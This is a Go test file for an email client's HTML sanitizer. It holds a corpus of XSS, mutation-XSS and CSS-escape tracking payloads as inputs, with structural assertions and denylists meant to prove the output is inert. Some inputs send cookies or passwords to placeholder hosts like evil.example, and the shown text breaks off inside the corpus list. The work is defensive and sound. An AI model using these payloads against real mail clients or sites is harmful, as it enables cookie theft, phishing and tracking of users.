// SPDX-License-Identifier: AGPL-3.0-only

package api

import (
	"regexp"
	"strconv"
	"strings"
	"testing"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

// The hostile-HTML corpus, and the two ways its output is judged.
//
// See docs/hostile-content.md for what these defend and what they do not.
//
// ── HOW THE OUTPUT IS JUDGED, AND WHY IT IS NOT `strings.Contains` ───────────
//
// The obvious assertion — "the output does not contain the substring `onerror`"
// — is WRONG, and finding out why is worth the paragraph:
//
//	in:  <div title='&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'>t</div>
//	out: <div title="&#34;&gt;&lt;img src=x onerror=alert(1)&gt;">t</div>
//
// The output contains the literal bytes ` onerror=alert(1)` — INSIDE an escaped
// attribute value, where they are a tooltip string and nothing else. A substring
// check calls that a vulnerability; a browser calls it text. Meanwhile the
// substring check would have happily passed an output that really did carry a
// live handler under a name nobody thought to add to the list.
//
// So the primary assertion is STRUCTURAL: re-parse the sanitized output and walk
// the tree. If the DOM a browser would build has no element outside the
// allowlist, no `on*` attribute, no dangerous URL and no fetching CSS, then
// there is nothing to execute and nothing to fetch — whatever bytes happen to
// spell it. That is the actual security property, stated as itself.
//
// A short substring list survives alongside it, for the ONE class of claim
// substrings can make soundly: a literal '<' in the output is ALWAYS a tag
// delimiter (html.EscapeString turns every '<' in text and in an attribute value
// into `&lt;`), so "the output contains no `<script`" is exact.

// forbiddenMarkup: a literal '<' in sanitized output can only be a tag, so these
// are sound substring assertions.
var forbiddenMarkup = []string{
	"<script", "<iframe", "<object", "<embed", "<applet",
	"<svg", "<math", "<foreignobject",
	"<meta", "<link", "<base", "<title",
	"<form", "<input", "<button", "<textarea", "<select",
	"<audio", "<video", "<source", "<track", "<canvas",
	"<frame", "<frameset", "<noscript", "<template", "<noembed",
	"<xmp", "<plaintext", "<marquee",
}

// assertSafeDOM re-parses sanitized output and asserts the tree a browser would
// build carries nothing that executes and nothing that fetches. This is the
// invariant; everything else in this file is a way of reaching it.
func assertSafeDOM(t *testing.T, in, out string) {
	t.Helper()

	nodes, err := html.ParseFragmentWithOptions(
		strings.NewReader(out),
		&html.Node{Type: html.ElementNode, Data: "body", DataAtom: atom.Body},
		html.ParseOptionEnableScripting(false),
	)
	if err != nil {
		t.Fatalf("sanitized output does not re-parse: %v\n  in:  %s\n  out: %s", err, in, out)
	}

	fail := func(format string, args ...any) {
		t.Helper()
		t.Errorf(format+"\n  in:  %s\n  out: %s", append(args, in, out)...)
	}

	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			name := strings.ToLower(n.Data)
			if !allowedElements[name] && name != "style" {
				fail("element <%s> survived and is not on the allowlist", name)
			}
			for _, a := range n.Attr {
				key := strings.ToLower(a.Key)
				val := normalizeURL(a.Val) // lowercase, control/space characters stripped

				if strings.HasPrefix(key, "on") {
					fail("attribute %q survived: an event handler reached the DOM", key)
				}
				if a.Namespace != "" {
					fail("namespaced attribute %s:%s survived", a.Namespace, key)
				}

				switch key {
				case "href":
					if scheme, ok := splitScheme(val); ok && !linkSchemes[scheme] {
						fail("href with scheme %q survived (%q)", scheme, a.Val)
					}
				case "src":
					if classifyImageSrc(a.Val) != srcInline {
						fail("src=%q survived and is not an inline (data:image/cid:) source", a.Val)
					}
				case "srcset", "background", "poster", "action", "formaction",
					"http-equiv", "srcdoc", "lowsrc", "dynsrc", "data", "ping":
					fail("fetching attribute %q survived (%q)", key, a.Val)
				case "style":
					assertInertCSS(t, fail, a.Val, cssCheckDeclarations)
				}
			}
			if name == "style" {
				for c := n.FirstChild; c != nil; c = c.NextSibling {
					if c.Type == html.TextNode {
						assertInertCSS(t, fail, c.Data, cssCheckStylesheet)
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	for _, n := range nodes {
		walk(n)
	}
}

// ── THE CSS ASSERTIONS, AND WHY THERE ARE THREE OF THEM (Forgejo #297) ───────
//
// This used to be one line:
//
//	for _, bad := range []string{"url(", "@import", "expression(", …} {
//	    if strings.Contains(strings.ToLower(css), bad) { fail(…) }
//	}
//
// which is THE SAME STRING MODEL as the code it was testing (a regex looking for
// those same literals). A test built on the code's model cannot discover the
// code's model error, and it did not: `\75 rl(https://tracker.example/x.png)` is
// a valid <url-token> to every browser, contains none of those bytes, survived
// the sanitizer, and FETCHED in real Chromium.
//
// So the CSS half now gets what the HTML half always had — a structural
// assertion — plus a second, deliberately DIFFERENT model, because the whole
// lesson of #297 is that one model checking itself proves nothing:
//
//	1. cssCheckDeclaredProperties — every declaration in surviving CSS names a
//	   property on the sanitizer's allowlist. This is the security property
//	   stated as itself: a property that cannot name a resource cannot fetch,
//	   whatever its value says.
//	2. cssCheckNoFetchingTokens — no token in the stream is a <url-token>, an
//	   unrecognized function, or an unrecognized at-rule. Tokens, not substrings:
//	   escapes are already decoded by the time this looks.
//	3. cssCheckNoDangerousLiteral — decode EVERY escape with a hand-rolled decoder
//	   that knows nothing about tokens, then substring-match the classic denylist.
//	   This is the independent model. If the tokenizer were ever wrong about what
//	   `\75 ` means, (1) and (2) would be wrong with it and this would still see
//	   `url(`.
//
// Each of the three is negative-controlled in
// TestTheCSSInertnessCheckerCanActuallyFail: a security assertion that cannot go
// red is documentation (#131).

// cssCheckMode says how a surviving CSS fragment should be read: a style=""
// attribute is a declaration list, a <style> element's contents are a stylesheet.
type cssCheckMode int

const (
	cssCheckDeclarations cssCheckMode = iota
	cssCheckStylesheet
)

// assertInertCSS: CSS that survived may not fetch and may not execute.
func assertInertCSS(t *testing.T, fail func(string, ...any), css string, mode cssCheckMode) {
	t.Helper()
	cssCheckDeclaredProperties(fail, css, mode)
	cssCheckNoFetchingTokens(fail, css)
	cssCheckNoDangerousLiteral(fail, css, mode)
}

// cssCheckDeclaredProperties asserts that every DECLARATION in css names a
// property on the sanitizer's allowlist. That is the security property stated as
// itself: a property that cannot name a resource cannot fetch one, however
// cleverly its value is spelled.
//
// It finds declarations with a flat scanner and a one-bit stack rather than by
// re-running the sanitizer's parser, so it is a different decomposition of the
// same bytes:
//
//   - an identifier followed by ':' is a PROPERTY only at a declaration start —
//     right after '{' or ';', or at the very beginning of a style="" value;
//   - and only inside a DECLARATION block. `a:hover{…}` is a selector, and the
//     contents of `@media …{ }` are rules, not declarations.
func cssCheckDeclaredProperties(fail func(string, ...any), css string, mode cssCheckMode) {
	toks := cssTokenize(css)
	inDeclarations := mode == cssCheckDeclarations
	atDeclarationStart := inDeclarations
	sawAtKeyword := false // an at-keyword since the last block boundary
	var blockStack []bool // per open '{': are its contents declarations?
	for i, t := range toks {
		switch t.kind {
		case cssWhitespace:
			// Whitespace changes nothing: "{ color:red }" is still a declaration.
		case cssAtKeyword:
			sawAtKeyword = true
			atDeclarationStart = false
		case cssLBrace:
			// An at-rule's block holds rules; a qualified rule's block holds
			// declarations.
			inDeclarations = !sawAtKeyword
			blockStack = append(blockStack, inDeclarations)
			sawAtKeyword = false
			atDeclarationStart = inDeclarations
		case cssRBrace:
			if len(blockStack) > 0 {
				blockStack = blockStack[:len(blockStack)-1]
			}
			inDeclarations = len(blockStack) > 0 && blockStack[len(blockStack)-1]
			sawAtKeyword = false
			atDeclarationStart = false
		case cssSemicolon:
			sawAtKeyword = false
			atDeclarationStart = inDeclarations
		case cssIdent:
			wasStart := atDeclarationStart
			atDeclarationStart = false
			if !wasStart || !inDeclarations {
				continue
			}
			// Look ahead past whitespace for the ':' that makes this a declaration.
			j := i + 1
			for j < len(toks) && toks[j].kind == cssWhitespace {
				j++
			}
			if j >= len(toks) || toks[j].kind != cssColon {
				continue
			}
			if prop := cssASCIILower(t.value); !cssAllowedProperties[prop] {
				fail("CSS %q survived and declares the property %q, which is NOT on "+
					"cssAllowedProperties — the allowlist is the whole defence", css, prop)
			}
		default:
			atDeclarationStart = false
		}
	}
}

// cssCheckNoFetchingTokens asserts that no token in css can name a resource or
// reach outside the stylesheet.
func cssCheckNoFetchingTokens(fail func(string, ...any), css string) {
	for _, t := range cssTokenize(css) {
		switch t.kind {
		case cssURL:
			fail("CSS %q survived and contains a <url-token> (%q)", css, t.value)
		case cssBad:
			fail("CSS %q survived and contains a token the tokenizer refused to "+
				"model — it must not have been emitted at all", css)
		case cssFunction:
			name := cssASCIILower(t.value)
			if !cssAllowedValueFunctions[name] && !cssAllowedSelectorFunctions[name] {
				fail("CSS %q survived and calls the function %q(), which is on neither "+
					"function allowlist", css, name)
			}
		case cssAtKeyword:
			if name := cssASCIILower(t.value); !cssAllowedAtRules[name] {
				fail("CSS %q survived and contains the at-rule @%s", css, name)
			}
		}
	}
}

// cssDangerousLiterals is the classic denylist — the one the OLD assertion used.
// It is kept, but it is now applied to FULLY UNESCAPED bytes and it is the
// SECOND opinion rather than the only one. On its own it is exactly the check
// that missed #297; downstream of an escape decoder that shares no code with the
// sanitizer, it is an independent witness.
var cssDangerousLiterals = []string{
	"url(", "@import", "@charset", "@namespace", "@font-face", "@property",
	"expression(", "image-set(", "cross-fade(", "element(", "src(", "attr(",
	"-moz-binding", "behavior:", "behaviour:", "javascript:", "vbscript:",
	"progid:", "<",
}

// cssDeclarationOnlyLiterals are dangerous in a DECLARATION LIST but legitimate
// in a stylesheet (#324).
//
// '>' is the child combinator: a selector delimiter, and meaningless inside a
// style="" attribute, which has no selectors and whose cssValueDelims exclude it.
// So it stays forbidden on the declaration path and is allowed on the stylesheet
// path — narrowing where the change applies rather than everywhere.
//
// '<' is NOT here and never can be: it is what '</style' needs.
var cssDeclarationOnlyLiterals = []string{">"}

// cssSpaceBeforeParen collapses "url \t (" to "url(" so the literal check cannot
// be walked around with whitespace.
var cssSpaceBeforeParen = regexp.MustCompile(`\s+\(`)

// cssCheckNoDangerousLiteral decodes every CSS escape and then looks for the
// classic dangerous literals.
func cssCheckNoDangerousLiteral(fail func(string, ...any), css string, mode cssCheckMode) {
	decoded := cssSpaceBeforeParen.ReplaceAllString(cssFullyUnescape(css), "(")
	low := strings.ToLower(decoded)
	banned := cssDangerousLiterals
	if mode == cssCheckDeclarations {
		banned = append(append([]string{}, cssDangerousLiterals...), cssDeclarationOnlyLiterals...)
	}
	for _, bad := range banned {
		if strings.Contains(low, bad) {
			fail("CSS %q survived: with every escape decoded it reads %q, which contains %q",
				css, decoded, bad)
		}
	}
}

// cssFullyUnescape decodes every `\XXXXXX ` / `\c` CSS escape in s.
//
// It is written from CSS Syntax §4.3.7 directly and shares NOT ONE LINE with the
// sanitizer's scanner, on purpose: it is this file's independent model of what an
// escape means. It does not tokenize, it does not know what a string or a comment
// is, and it decodes escapes everywhere — which makes it strictly more paranoid
// than a real parser, which is the correct direction for a test.
func cssFullyUnescape(s string) string {
	src := []rune(s)
	var b strings.Builder
	for i := 0; i < len(src); i++ {
		if src[i] != '\\' || i+1 >= len(src) {
			b.WriteRune(src[i])
			continue
		}
		i++
		if !isHexRune(src[i]) {
			b.WriteRune(src[i]) // `\;` is a literal ';'
			continue
		}
		cp, n := 0, 0
		for i < len(src) && n < 6 && isHexRune(src[i]) {
			v, _ := strconv.ParseInt(string(src[i]), 16, 32)
			cp = cp*16 + int(v)
			i++
			n++
		}
		// One trailing whitespace character terminates the escape and is eaten.
		if i < len(src) && (src[i] == ' ' || src[i] == '\t' || src[i] == '\n') {
			i++
		}
		i-- // the loop's i++ will step past the last consumed rune
		if cp > 0 && cp <= 0x10FFFF && (cp < 0xD800 || cp > 0xDFFF) {
			b.WriteRune(rune(cp))
		} else {
			b.WriteRune('�')
		}
	}
	return b.String()
}

func isHexRune(r rune) bool {
	return (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')
}

func TestSanitizeHTML(t *testing.T) {
	cases := []struct {
		name string
		in   string
		// want: substrings that MUST survive (the legitimate content).
		want []string
		// notWant: case-specific extras on top of `forbidden`.
		notWant []string
	}{
		{
			name: "a plain script tag",
			in:   `<p>Hello</p><script>fetch("https://evil.example/"+document.cookie)</script>`,
			want: []string{"<p>Hello</p>"},
			// The script's TEXT must not survive either: html.Render would emit a
			// <script>'s children as raw text, so dropping the subtree (not just the
			// element) is the only correct answer.
			notWant: []string{"document.cookie", "evil.example"},
		},
		{
			name:    "an event handler on an image",
			in:      `<img src="x" onerror="alert(document.domain)">`,
			notWant: []string{"alert("},
		},
		{
			name:    "an event handler with odd casing and whitespace",
			in:      `<div OnMouseOver = "alert(1)" onFocus=alert(2)>hi</div>`,
			want:    []string{"hi"},
			notWant: []string{"alert("},
		},
		{
			name: "svg with a script child",
			in:   `<svg><script>alert(1)</script><image href="https://tracker.example/p.gif"/></svg><p>after</p>`,
			want: []string{"<p>after</p>"},
			// The whole foreign-content subtree goes, contents included.
			notWant: []string{"alert(1)", "tracker.example"},
		},
		{
			name:    "svg animate / set-based script execution",
			in:      `<svg><a><animate attributeName="href" values="javascript:alert(1)" /><text>click</text></a></svg>`,
			notWant: []string{"animate", "alert(1)"},
		},
		{
			name:    "MathML foreign content",
			in:      `<math><maction actiontype="statusline#javascript:alert(1)">x</maction></math>`,
			notWant: []string{"maction", "alert(1)"},
		},
		{
			name: "a remote tracking pixel is parked where the client cannot restore it",
			in:   `<p>hi</p><img src="https://tracker.example/open.gif?id=abc123" width="1" height="1">`,
			want: []string{
				"<p>hi</p>",
				// A 1×1 is a beacon, not a picture, so its URL is parked under the
				// PIXEL name (#55 increment 2). The client restores the two `remote`
				// names and has no case for this one, so the suppression is
				// structural rather than a decision anyone can get wrong.
				`data-mailroom-pixel-src="https://tracker.example/open.gif?id=abc123"`,
				// Still marked blocked: it IS remote content that was withheld.
				`data-mailroom-blocked=""`,
			},
			// NOTE the leading space on the first. The sanitizer writes ` src="`
			// before an attribute, and `data-mailroom-remote-src="` also ENDS in
			// `src="` — so an assertion without the boundary would match the very
			// attribute that proves the block worked. (assertSafeDOM is the
			// assertion that actually decides this case; these name the technique.)
			//
			// ⚠ The second is the one that makes this increment mean anything: the
			// RESTORABLE name must be absent. If it were present, the client would
			// un-park the beacon for any allowed sender and the feature would be
			// decorative while still looking like it worked.
			notWant: []string{
				` src="https://tracker.example`,
				"data-mailroom-remote-src=",
			},
		},
		{
			name: "a 1x1 carrying a srcset is parked as a pixel too",
			// The hole this closes: handling only `src` would leave a beacon's
			// srcset under a restorable name, and it would load.
			in:      `<img srcset="https://tracker.example/p.gif 1x" width="1" height="1">`,
			want:    []string{"data-mailroom-pixel-srcset=", `data-mailroom-blocked=""`},
			notWant: []string{"data-mailroom-remote-srcset=", ` srcset="https`},
		},
		{
			name: "a 1x600 divider is NOT a tracking pixel",
			// ⚠ The negative control for the rule. A one-pixel-wide rule line is
			// ordinary mail; suppressing it would delete a visible part of the
			// message, silently, for a sender the user chose to trust. Requiring
			// BOTH dimensions to be tiny is what separates the two.
			in:      `<img src="https://cdn.example/rule.png" width="1" height="600">`,
			want:    []string{`data-mailroom-remote-src="https://cdn.example/rule.png"`},
			notWant: []string{"data-mailroom-pixel-src="},
		},
		{
			name: "a percentage size is not a dimension, so it is not a pixel",
			// ⚠ THE NUMBERS ARE 1% DELIBERATELY, and an earlier version of this
			// case got it wrong. It used width="50%" height="1" — but 50 is not
			// ≤ 1, so the case passed whether or not the parser stripped the "%",
			// and probing found it green with a parser that did. At 1% the two
			// behaviours finally differ: read as a number it is a 1×1 and gets
			// suppressed; read correctly it is "no dimension declared" and renders.
			//
			// A percentage is a RESPONSIVE image — the opposite of a beacon — so
			// getting this wrong silently deletes real content from trusted mail.
			in:      `<img src="https://cdn.example/hero.png" width="1%" height="1%">`,
			want:    []string{`data-mailroom-remote-src="https://cdn.example/hero.png"`},
			notWant: []string{"data-mailroom-pixel-src="},
		},
		{
			name:    "a protocol-relative tracking pixel",
			in:      `<img src="//tracker.example/p.gif">`,
			want:    []string{`data-mailroom-remote-src="//tracker.example/p.gif"`},
			notWant: []string{` src="//tracker.example`},
		},
		{
			name:    "srcset is a tracking pixel too",
			in:      `<img srcset="https://tracker.example/1x.gif 1x, https://tracker.example/2x.gif 2x">`,
			want:    []string{"data-mailroom-remote-srcset=", `data-mailroom-blocked=""`},
			notWant: []string{` srcset="https`},
		},
		{
			name: "an inline data: image and a cid: image are NOT remote",
			in: `<img src="data:image/png;base64,iVBORw0KGgo="><img src="cid:logo@example.com">` +
				`<img src="data:image/svg+xml;base64,PHN2Zz4=">`,
			want: []string{`src="data:image/png;base64,iVBORw0KGgo="`, `src="cid:logo@example.com"`},
			// ...but an SVG data: URL is a scripting context in an <img> costume.
			notWant: []string{"PHN2Zz4=", "data-mailroom-blocked"},
		},
		{
			name:    "css @import",
			in:      `<style>@import url("https://tracker.example/t.css");p{color:red}</style><p>x</p>`,
			want:    []string{"<p>x</p>"},
			notWant: []string{"tracker.example", "@import"},
		},
		{
			name: "css @import smuggled through a comment",
			in:   `<style>@im/**/port url(https://tracker.example/t.css);</style>`,
			// Comments are stripped BEFORE the danger check, so the reassembled
			// "@import" is seen and the declaration is dropped.
			notWant: []string{"tracker.example", "port url"},
		},
		{
			name:    "a css background image is a tracking pixel",
			in:      `<div style="background:url('https://tracker.example/bg.png');color:blue">x</div>`,
			want:    []string{"x", "color:blue"},
			notWant: []string{"tracker.example"},
		},
		{
			name:    "css url() with whitespace before the paren",
			in:      `<div style="background: url ('https://tracker.example/bg.png')">x</div>`,
			notWant: []string{"tracker.example"},
		},
		{
			name:    "css expression() and -moz-binding",
			in:      `<div style="width:expression(alert(1));-moz-binding:url(http://evil.example/x.xml)">x</div>`,
			want:    []string{"x"},
			notWant: []string{"alert(1)", "evil.example"},
		},
		{
			name:    "a font-face fetches too",
			in:      `<style>@font-face{font-family:t;src:url(https://tracker.example/f.woff)}</style>`,
			notWant: []string{"tracker.example"},
		},

		// ── Forgejo #297: the CSS the old regex could not see ──────────────────
		//
		// CSS Syntax §4.3.1 decodes an identifier's escapes BEFORE anything
		// compares it, so each of these spells a construct the sanitizer claimed to
		// remove while containing none of its bytes. Every one of them was
		// MEASURED fetching in real Chromium before the fix. The positive control
		// for this whole group is "a real newsletter's layout survives" and
		// TestSanitizerKeepsLegitimateCSS below: if the allowlist ever removed
		// everything, these cases would pass vacuously and those would go red.
		{
			name: "#297: url() spelled with a CSS escape, in a <style> body",
			// `\75 ` is 'u'. The space TERMINATES the escape, so this is url(…).
			in:      `<style>p{background:\75 rl(https://tracker.example/bg.png);color:red}</style><p>x</p>`,
			want:    []string{"<p>x</p>"},
			notWant: []string{"tracker.example", `\75`},
		},
		{
			name:    "#297: url() spelled with a CSS escape, in a style attribute",
			in:      `<div style="background-image:\75 rl(https://tracker.example/a.png);color:blue">x</div>`,
			want:    []string{"x", "color:blue"},
			notWant: []string{"tracker.example", `\75`},
		},
		{
			name:    "#297: the u\\72 l family — the escape in the middle of the name",
			in:      `<div style="background:u\72 l(https://tracker.example/b.png)">x</div>`,
			want:    []string{"x"},
			notWant: []string{"tracker.example", `\72`},
		},
		{
			name:    "#297: @import spelled with a CSS escape",
			in:      `<style>@\69 mport url(https://tracker.example/t.css);p{color:red}</style>`,
			want:    []string{"color:red"},
			notWant: []string{"tracker.example", "@import", `\69`},
		},
		{
			name: "#297: image-set() needed no trick at all — it was simply not on the list",
			in: `<div style="background-image:image-set('https://tracker.example/c.png' 1x)">a</div>` +
				`<div style="background:-webkit-image-set(url(https://tracker.example/d.png) 1x)">b</div>`,
			want:    []string{">a<", ">b<"},
			notWant: []string{"tracker.example", "image-set"},
		},
		{
			name: "#297: the rest of the image-function family",
			in: `<div style="background:cross-fade(url(https://tracker.example/e.png),50%)">a</div>` +
				`<div style="background:element(#hidden)">b</div>` +
				`<div style="background:image(https://tracker.example/f.png)">c</div>` +
				`<div style="background:-moz-element(#hidden)">d</div>`,
			want:    []string{">a<", ">b<", ">c<", ">d<"},
			notWant: []string{"tracker.example", "cross-fade", "element("},
		},
		{
			name:    "#297: expression() spelled with a CSS escape",
			in:      `<div style="width:e\78 pression(alert(1));color:#333">x</div>`,
			want:    []string{"x", "color:#333"},
			notWant: []string{"alert(1)", `\78`},
		},
		{
			name: "#297: every other property whose value is only ever a URL",
			in: `<div style="cursor:url(https://tracker.example/g.cur),auto">a</div>` +
				`<div style="list-style-image:url(https://tracker.example/h.png)">b</div>` +
				`<div style="border-image-source:url(https://tracker.example/i.png)">c</div>` +
				`<div style="content:url(https://tracker.example/j.png)">d</div>` +
				`<div style="filter:url(https://tracker.example/k.svg#f)">e</div>` +
				`<div style="mask-image:url(https://tracker.example/l.png)">f</div>` +
				`<div style="behavior:url(#default#time2)">g</div>`,
			want:    []string{">a<", ">b<", ">c<", ">d<", ">e<", ">f<", ">g<"},
			notWant: []string{"tracker.example", "behavior", "url("},
		},
		{
			name: "#297: the PROPERTY allowlist, observed on its own",
			// Every case above is stopped by two gates at once (the property is not
			// on the list AND the value contains a url-token or an unlisted
			// function), so none of them can tell whether the property allowlist is
			// doing anything. These values are entirely inert, so ONLY the property
			// allowlist rejects them — which is what makes deleting it a red test
			// rather than a silent widening.
			in: `<div style="position:absolute;top:0;left:0;z-index:9;color:red">a</div>` +
				`<style>p{content:normal;animation:spin 2s;color:blue}</style>`,
			want:    []string{">a<", "color:red", "color:blue"},
			notWant: []string{"position", "top:0", "left:0", "z-index", "content", "animation"},
		},
		{
			name: "#297: a custom property cannot smuggle a URL in through var()",
			// --x is not on the property allowlist and var() is not on the function
			// allowlist, so neither half of the indirection survives.
			in:      `<div style="--bg:url(https://tracker.example/m.png);background-image:var(--bg)">x</div>`,
			want:    []string{"x"},
			notWant: []string{"tracker.example", "var(", "--bg"},
		},
		{
			name: "#297: the OLD danger list still holds under the new design",
			// These are the vectors the regex did stop. Whatever replaced it must
			// still stop them, so they are asserted explicitly rather than assumed.
			in: `<div style="width:expression(alert(1))">a</div>` +
				`<div style="behavior:url(#x)">b</div>` +
				`<div style="-moz-binding:url(http://evil.example/x.xml)">c</div>` +
				`<div style="color:javascript:alert(1)">d</div>` +
				`<div style="background:vbscript:msgbox(1)">e</div>` +
				`<style>@charset "utf-8";@namespace url(http://evil.example/ns);p{color:red}</style>`,
			want:    []string{">a<", ">b<", ">c<", ">d<", ">e<", "color:red"},
			notWant: []string{"expression", "behavior", "moz-binding", "javascript:", "vbscript:", "evil.example", "@charset", "@namespace"},
		},
		{
			name: "#297: legitimate CSS still survives — the positive control for this group",
			// If the allowlist destroyed everything, every hostile case above would
			// pass for the wrong reason (assertInertCSS never running on a non-empty
			// string). This is the case that makes them mean something.
			in: `<style>@media only screen and (max-width:600px){.col{width:100%;padding:0 12px}}` +
				`.btn{background:#0057b8;color:#fff;border-radius:4px}</style>` +
				`<div style="font-family:Arial,sans-serif;font-size:14px;color:#333;background:#f4f4f4">hi</div>`,
			want: []string{
				"@media only screen and (max-width:600px)",
				"width:100%", "padding:0 12px",
				".btn{background:#0057b8;color:#fff;border-radius:4px}",
				"font-family:Arial,sans-serif", "font-size:14px", "color:#333", "background:#f4f4f4",
				"hi",
			},
		},
		{
			name: "a form posting offsite",
			in: `<form action="https://evil.example/steal" method="POST">` +
				`<input name="password" type="password"><button>Sign in</button></form>`,
			// The form is UNWRAPPED: its inputs are gone but its text is not, so a
			// message that happens to be wrapped in a <form> is still readable.
			notWant: []string{"evil.example", "password"},
		},
		{
			name:    "meta refresh — the CSP-proof tracking beacon and phishing redirect",
			in:      `<meta http-equiv="refresh" content="0;url=https://evil.example/phish?id=abc"><p>hi</p>`,
			want:    []string{"<p>hi</p>"},
			notWant: []string{"evil.example", "refresh"},
		},
		{
			name: "link rel=dns-prefetch / preconnect — CSP does not govern these at all",
			in: `<link rel="dns-prefetch" href="//abc123.tracker.example">` +
				`<link rel="preconnect" href="https://abc123.tracker.example">` +
				`<link rel="stylesheet" href="https://tracker.example/t.css">`,
			notWant: []string{"tracker.example"},
		},
		{
			name:    "javascript: href",
			in:      `<a href="javascript:alert(1)">click</a>`,
			want:    []string{"click"},
			notWant: []string{"alert(1)", "href="},
		},
		{
			name: "javascript: href obfuscated with control characters and entities",
			in: "<a href=\"java\tscript:alert(1)\">a</a>" +
				`<a href="java&#9;script:alert(1)">b</a>` +
				`<a href=" JaVaScRiPt:alert(1)">c</a>` +
				"<a href=\"\x01javascript:alert(1)\">d</a>",
			want:    []string{">a<", ">b<", ">c<", ">d<"},
			notWant: []string{"alert(1)", "href="},
		},
		{
			name: "an ordinary link survives — and is forced safe",
			in:   `<a href="https://example.com/x" target="_self" rel="opener">read more</a>`,
			want: []string{
				`href="https://example.com/x"`,
				`target="_blank"`,
				`rel="noopener noreferrer nofollow"`,
				"read more",
			},
			// The message does not get to choose target/rel. `target="_self"` inside
			// a sandboxed frame would navigate the message pane itself.
			notWant: []string{`target="_self"`, `rel="opener"`},
		},
		{
			name:    "a mailto link survives",
			in:      `<a href="mailto:someone@example.com">mail</a>`,
			want:    []string{`href="mailto:someone@example.com"`},
			notWant: nil,
		},
		{
			name: "noscript — the scripting-mode parser differential",
			// With scripting ENABLED (the x/net/html DEFAULT), a parser treats the
			// contents of <noscript> as RAW TEXT and a sanitizer walks straight past
			// this. Our sandboxed iframe has scripting DISABLED, so the BROWSER
			// parses it as markup. We parse in the browser's mode and unwrap the
			// element, so the differential cannot exist.
			in: `<noscript><img src="https://tracker.example/p.gif" onerror="alert(1)"></noscript>`,
			// The <img> IS seen — as markup, exactly as the sandboxed (scripting-off)
			// browser sees it — so its handler is stripped and its remote src is
			// blocked, rather than being waved through as an inert-looking raw-text
			// blob that the renderer then treats as live markup.
			want:    []string{`data-mailroom-remote-src="https://tracker.example/p.gif"`},
			notWant: []string{"alert(1)", ` src="https://tracker.example`},
		},
		{
			name: "mXSS: attribute-value breakout through re-serialization",
			// The classic: a sanitizer that emits the attacker's bytes back out can
			// be tricked into re-forming a tag. We re-render from a parse tree and
			// escape every value, so the quote comes back as &#34; and stays inert.
			in: `<div title='&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'>t</div>`,
			// The payload survives ONLY as ESCAPED TEXT inside an attribute value,
			// where it is a tooltip string. `&lt;img` proves it is escaped, and
			// assertSafeDOM proves the DOM a browser builds from this has no <img>
			// element and no on* attribute anywhere.
			//
			// This is the case that shows why `strings.Contains(out, "onerror")` is
			// the wrong assertion: those bytes ARE in the output, and they are inert.
			want:    []string{"&lt;img"},
			notWant: []string{`"><img`},
		},
		{
			name:    "mXSS: a comment used to smuggle markup",
			in:      `<!--<img src=x onerror=alert(1)>--><p>ok</p>`,
			want:    []string{"<p>ok</p>"},
			notWant: []string{"alert(1)", "<!--"},
		},
		{
			name:    "a plaintext / xmp raw-text element",
			in:      `<xmp><img src=x onerror=alert(1)></xmp><plaintext><script>alert(2)</script>`,
			notWant: []string{"alert(1)", "alert(2)"},
		},
		{
			name:    "unknown and custom elements are unwrapped, not trusted",
			in:      `<x-widget onclick="alert(1)" data-x="1">important text</x-widget>`,
			want:    []string{"important text"},
			notWant: []string{"x-widget", "alert(1)"},
		},
		{
			name: "a real newsletter's layout survives",
			// The sanitizer must not be so aggressive that legitimate mail is
			// destroyed. HTML mail is HTML 4 with tables and presentational
			// attributes; strip those and every newsletter becomes a wall of text.
			in: `<table width="600" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff">` +
				`<tr><td align="center" style="font-family:Arial;font-size:14px;color:#333">` +
				`<h1>Hello</h1><p>Body <b>text</b> and a <a href="https://example.com">link</a>.</p>` +
				`</td></tr></table>`,
			want: []string{
				`<table width="600" cellpadding="0" cellspacing="0" border="0" bgcolor="#ffffff">`,
				`align="center"`, "font-family:Arial", "<h1>Hello</h1>", "<b>text</b>",
				`href="https://example.com"`,
			},
		},
		{
			name: "empty and malformed input is total",
			in:   `<p>unclosed<div><span>`,
			want: []string{"unclosed"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := SanitizeHTML(tc.in)
			low := strings.ToLower(got)

			// The invariant.
			assertSafeDOM(t, tc.in, got)

			for _, bad := range forbiddenMarkup {
				if strings.Contains(low, bad) {
					t.Errorf("output contains the forbidden element %q\n  in:  %s\n  out: %s", bad, tc.in, got)
				}
			}
			for _, bad := range tc.notWant {
				if strings.Contains(got, bad) {
					t.Errorf("output still contains %q\n  in:  %s\n  out: %s", bad, tc.in, got)
				}
			}
			for _, want := range tc.want {
				if !strings.Contains(got, want) {
					t.Errorf("output lost the legitimate content %q\n  in:  %s\n  out: %s", want, tc.in, got)
				}
			}
		})
	}
}

// The sanitizer's output must be a FIXED POINT: sanitizing it again changes
// nothing. If it is not, then the first pass emitted something its own parser
// reads differently than it wrote it — which is the definition of a mutation-XSS
// gap, and it is exactly the property a "the browser parses it differently"
// attack needs.
func TestSanitizeHTMLIsIdempotent(t *testing.T) {
	for _, in := range hostileCorpus() {
		once := SanitizeHTML(in)
		twice := SanitizeHTML(once)
		if once != twice {
			t.Errorf("not a fixed point:\n  in:    %s\n  once:  %s\n  twice: %s", in, once, twice)
		}
	}
}

// Nothing in the corpus, however malformed, may panic or hang: a message body is
// hostile input and this function is on the read path of every HTML mail.
func TestSanitizeHTMLIsTotal(t *testing.T) {
	inputs := append(hostileCorpus(),
		"", "<", ">", "<<<<<<", strings.Repeat("<div>", 5000),
		strings.Repeat("<a href=\"javascript:alert(1)\">x</a>", 1000),
		"\x00\x01\x02<p>\xff\xfe</p>",
	)
	for _, in := range inputs {
		func() {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("panic on %.60q: %v", in, r)
				}
			}()
			_ = SanitizeHTML(in)
		}()
	}
}

// hostileCorpus is every payload in this file, plus a few that are only
// interesting to the properties above.
func hostileCorpus() []string {
	return []string{
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<svg><script>alert(1)</script></svg>`,
